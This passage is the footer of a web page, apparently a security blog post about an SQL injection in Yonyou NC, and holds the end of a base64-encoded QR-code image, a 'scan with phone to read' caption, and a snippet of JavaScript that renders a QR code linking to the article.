dbeWxJtsjq4c/6rcejj9wnWhBtDPo7fVtIF2849fdwD2Q1939cudtIHm9OlZuXzFZv3nvUZP1do/amcd62L7EgT1yOHqHPakF5p27P3GvncXxBVlTTK965/R0zJ7k20CS3Hj9DWx/OvEofaIz1uOUrZtb7zxr5uHuS+x6iSfiD648s2d6zVdsb/YQavKZnvqsmXee+6Yv6Pr9huRGvhG2Xww9U59oYvVw8sCJRutIbUKv3P0rrddX8Vx/5VGb3p7rkT1LZ2uyNfPO1tzDvHusdS2xevh+Q3Ij3wjbQJzo5NVZM8kOPb1XrfsSd0/yFfS4Rmdrcq8ZW5PVVzz3757Zr3fq6Zm1mdsTjj9YebaBxHDj9Tew/ZTltOSro2XKwfTYG7YWX0dqQs8Z9z7jM2/0M496Z8/QtcRZR+gxl1d6egM9iQPzzvanHvTa/Yb02/gG8T2QyyF8ffHwY69H8LXqPGvmee0C889yegL9iQPzzp5DzXzFP+OZXvNwzhK4R7QgWpBY6JlsvXN6A729dr8h/Ta+Qbx9U8/EfhaefzVp17Im2xNWm97UPgt7w7MnWjD15NGDxB8hvo4rv74rz6x5D+H7DZm38+J8G0im81l85syupdcnp7M12Zq9nfVMvvJYs8f1w2c1vVc8e7v3qtZ9Pc55xDaQbrjj193AYSBOasVnx1x51c56uv6Zp2quZ75i17ZmfsWrM6hNXq3jXpNXXtfT2z2HgfTiHX/9DdwD+fo7v9zxrw9k9VrOE03PzOP3NZ+c2u/A9a7WmOcxt3fFV+vZv/L89YGsNr218xv4owP52SfFY9lnLvskhdWu2HVkvekP1MOzZt45PYFa4mDm0Sayx4R98qwn/6MDcaObf/0GDgPJlM5wto3+XveJ6drvxK4nu5Z7h63JemT1zukL9CQ+w2c89urtfFXTdxiIhZtfcwPbQPpT81F8dtTep8enQlbvbJ+a3iuePemd/mjB1JNH71itZ91a+gL1znrkXptx1ghW3m0gs+nOX3MD90Bec++nu/4PAAD//1tKAIkAAAAGSURBVAMAmvrDfRKvFaQAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-M0dUlE-redeploy-id-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 